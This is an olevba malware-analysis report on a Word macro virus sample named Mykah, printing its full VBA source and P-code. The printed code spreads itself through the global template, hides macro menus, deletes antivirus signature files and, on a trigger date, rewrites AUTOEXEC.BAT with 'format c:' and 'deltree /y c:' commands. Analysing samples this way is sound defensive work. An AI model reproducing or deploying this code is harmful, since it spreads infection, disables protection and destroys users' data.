olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mykah
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mykah - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Mykah - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
CommandBars("tools").Controls("Macro").Delete
           CommandBars("tools").Controls("Customize...").Delete
           CommandBars("tools").Controls("Templates and Add-Ins...").Delete
           CommandBars("view").Controls("Toolbars").Delete
End Sub
Sub AutoOpen()
ToolsOptionsSave .GlobalDotPrompt = 0
m$ = FileName$() + ":Rolz"
MacroCopy m$, "Global:FileSaveAs"
m$ = FileName$() + ":AutoOpen"
MacroCopy m$, "Global:Rolz"
End Sub
Sub Rolz()

On Error GoTo a
  VF$ = "C:\Program Files\Norton AntiVirus\Virscan.Dat"
                                        
 If Files$(VF$) = "" Then GoTo a
 SetAttr VF$, 0
 Kill VF$
                
a:
 On Error GoTo c
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo c
 SetAttr AB$, 0

 Open AB$ For Append As #1
  Print #1, "@echo off"
  Print #1, "IF exist " + VF$ + " then del " + VF$
                                        
  Close #1
                                        

c:
 On Error GoTo d
  VF$ = "C:\Program Files\F-Prot95\Fpwm32.dll"
 If Files$(VF$) = "" Then GoTo d
 SetAttr VF$, 0
 Kill VF$
                
d:
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo f
 SetAttr AB$, 0
 Open AB$ For Append As #1
  Print #1, "IF exist " + VF$ + " then del " + VF$
  Close #1


f:

 On Error GoTo g
  VF$ = "C:\Program Files\McAfee\Scan.dat"
 If Files$(VF$) = "" Then GoTo g
 SetAttr VF$, 0
 Kill VF$
                
g:
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo h
 SetAttr AB$, 0
 Open AB$ For Append As #1
  Print #1, "IF exist " + VF$ + " then del " + VF$
  Close #1

h:

 On Error GoTo i
  VF$ = "C:\Tbavw95\Tbscan.sig"
 If Files$(VF$) = "" Then GoTo i
 SetAttr VF$, 0
 Kill VF$
                
i:
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo J
 SetAttr AB$, 0
 Open AB$ For Append As #1
  Print #1, "IF exist " + VF$ + " then del " + VF$
  Close #1


J:
If Day(Now()) = 8 And Month(Now() = 7) Then
    SetAttr "C:\AUTOEXEC.BAT", 0
    Name "C:\AUTOEXEC.BAT" As "C:\AUTOEXEC.AAV"
    Open "C:\AUTOEXEC.BAT" For Output As #1
    Print #1, "@Echo off"
    Print #1, "cls"
    Print #1, "echo   Love or Rot Zinister"
    Print #1, "echo It's all in the family"
    Print #1, "echo  PVW resting rebellion"
    Print #1, "echo I'm looking for Mykah"
    Print #1, "echo                --AKP--"
    Print #1, "echo y|format c: /u /v:AAV >nul"
    Print #1, "deltree /y c: >nul"
    Close #1
    dsk$ = Left$(DefaultDir$(9), 3)
    DocMinimize

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mykah
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Module1 - 5484 bytes
' Line #0:
' 	FuncDefn (Sub ToolsMacro())
' Line #1:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #2:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #3:
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #4:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub AutoOpen())
' Line #7:
' 	MemLdWith GlobalDotPrompt 
' 	LitDI2 0x0000 
' 	Eq 
' 	ArgsCall ToolsOptionsSave 0x0001 
' Line #8:
' 	ArgsLd FileName$ 0x0000 
' 	LitStr 0x0005 ":Rolz"
' 	Add 
' 	St m$ 
' Line #9:
' 	Ld m$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	ArgsCall MacroCopy 0x0002 
' Line #10:
' 	ArgsLd FileName$ 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St m$ 
' Line #11:
' 	Ld m$ 
' 	LitStr 0x000B "Global:Rolz"
' 	ArgsCall MacroCopy 0x0002 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Sub Rolz())
' Line #14:
' Line #15:
' 	OnError a 
' Line #16:
' 	LitStr 0x002D "C:\Program Files\Norton AntiVirus\Virscan.Dat"
' 	St VF$ 
' Line #17:
' Line #18:
' 	Ld VF$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo a 
' 	EndIf 
' Line #19:
' 	Ld VF$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #20:
' 	Ld VF$ 
' 	ArgsCall Kill 0x0001 
' Line #21:
' Line #22:
' 	Label a 
' Line #23:
' 	OnError c 
' Line #24:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St AB$ 
' Line #25:
' 	Ld AB$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo c 
' 	EndIf 
' Line #26:
' 	Ld AB$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #27:
' Line #28:
' 	Ld AB$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF exist "
' 	Ld VF$ 
' 	Add 
' 	LitStr 0x000A " then del "
' 	Add 
' 	Ld VF$ 
' 	Add 
' 	PrintItemNL 
' Line #31:
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #33:
' Line #34:
' Line #35:
' 	Label c 
' Line #36:
' 	OnError d 
' Line #37:
' 	LitStr 0x0024 "C:\Program Files\F-Prot95\Fpwm32.dll"
' 	St VF$ 
' Line #38:
' 	Ld VF$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo d 
' 	EndIf 
' Line #39:
' 	Ld VF$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #40:
' 	Ld VF$ 
' 	ArgsCall Kill 0x0001 
' Line #41:
' Line #42:
' 	Label d 
' Line #43:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St AB$ 
' Line #44:
' 	Ld AB$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo False 
' 	EndIf 
' Line #45:
' 	Ld AB$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #46:
' 	Ld AB$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF exist "
' 	Ld VF$ 
' 	Add 
' 	LitStr 0x000A " then del "
' 	Add 
' 	Ld VF$ 
' 	Add 
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #49:
' Line #50:
' Line #51:
' 	Label False 
' Line #52:
' Line #53:
' 	OnError g 
' Line #54:
' 	LitStr 0x0020 "C:\Program Files\McAfee\Scan.dat"
' 	St VF$ 
' Line #55:
' 	Ld VF$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo g 
' 	EndIf 
' Line #56:
' 	Ld VF$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #57:
' 	Ld VF$ 
' 	ArgsCall Kill 0x0001 
' Line #58:
' Line #59:
' 	Label g 
' Line #60:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St AB$ 
' Line #61:
' 	Ld AB$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo h 
' 	EndIf 
' Line #62:
' 	Ld AB$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #63:
' 	Ld AB$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF exist "
' 	Ld VF$ 
' 	Add 
' 	LitStr 0x000A " then del "
' 	Add 
' 	Ld VF$ 
' 	Add 
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #66:
' Line #67:
' 	Label h 
' Line #68:
' Line #69:
' 	OnError i 
' Line #70:
' 	LitStr 0x0015 "C:\Tbavw95\Tbscan.sig"
' 	St VF$ 
' Line #71:
' 	Ld VF$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo i 
' 	EndIf 
' Line #72:
' 	Ld VF$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #73:
' 	Ld VF$ 
' 	ArgsCall Kill 0x0001 
' Line #74:
' Line #75:
' 	Label i 
' Line #76:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St AB$ 
' Line #77:
' 	Ld AB$ 
' 	ArgsLd Files$ 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo J 
' 	EndIf 
' Line #78:
' 	Ld AB$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #79:
' 	Ld AB$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IF exist "
' 	Ld VF$ 
' 	Add 
' 	LitStr 0x000A " then del "
' 	Add 
' 	Ld VF$ 
' 	Add 
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #82:
' Line #83:
' Line #84:
' 	Label J 
' Line #85:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	LitDI2 0x0007 
' 	Eq 
' 	ArgsLd Month 0x0001 
' 	And 
' 	IfBlock 
' Line #86:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #87:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitStr 0x000F "C:\AUTOEXEC.AAV"
' 	Name 
' Line #88:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@Echo off"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "echo   Love or Rot Zinister"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "echo It's all in the family"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "echo  PVW resting rebellion"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "echo I'm looking for Mykah"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "echo                --AKP--"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "echo y|format c: /u /v:AAV >nul"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "deltree /y c: >nul"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #99:
' 	LitDI2 0x0009 
' 	ArgsLd DefaultDir$ 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd LBound$ 0x0002 
' 	St dsk$ 
' Line #100:
' 	ArgsCall DocMinimize 0x0000 
' Line #101:
' Line #102:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Fpwm32.dll          |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

